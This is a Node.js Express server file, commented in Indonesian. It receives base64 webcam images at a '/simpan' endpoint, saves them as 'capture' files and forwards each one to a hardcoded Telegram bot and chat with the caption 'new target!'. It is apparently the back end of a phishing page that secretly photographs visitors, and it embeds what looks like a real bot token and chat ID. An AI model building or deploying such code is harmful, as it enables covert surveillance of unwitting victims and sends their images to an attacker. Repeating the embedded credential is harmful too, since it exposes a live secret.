const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
const app = express();

app.use(express.json({ limit: '20mb' }));
app.use(express.static('public'));

const BOT_TOKEN = '8604448756:AAHJ-CdHZpeiEM73TpjnMA5S2O5hu5oeU30'; 
const CHAT_ID = '7381262089';

const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

app.post('/simpan', async (req, res) => {
    console.log("📩 Request Masuk...");
    const base64Data = req.body.image;
    if (!base64Data) return res.status(400).send("No Image");

    try {
        const base64Image = base64Data.split(';base64,').pop();
        const buffer = Buffer.from(base64Image, 'base64');
        
        // Simpan Lokal
        const namaFile = `capture_${Date.now()}.jpg`;
        fs.writeFileSync(path.join(uploadDir, namaFile), buffer);
        console.log("✅ Tersimpan di folder");

        // Kirim Telegram
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, { filename: 'tangkapan.jpg' });
        form.append('caption', '📸 *ADA TARGET BARU!*');

        const tele = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders()
        });

        console.log("🤖 Respon Telegram:", tele.data.ok ? "SUKSES" : "GAGAL");
        res.json({ success: true });

    } catch (err) {
        console.error("🔥 ERROR DETECTED:", err.response ? err.response.data : err.message);
        res.status(500).json({ success: false });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('🚀 Server ON di Port ' + PORT));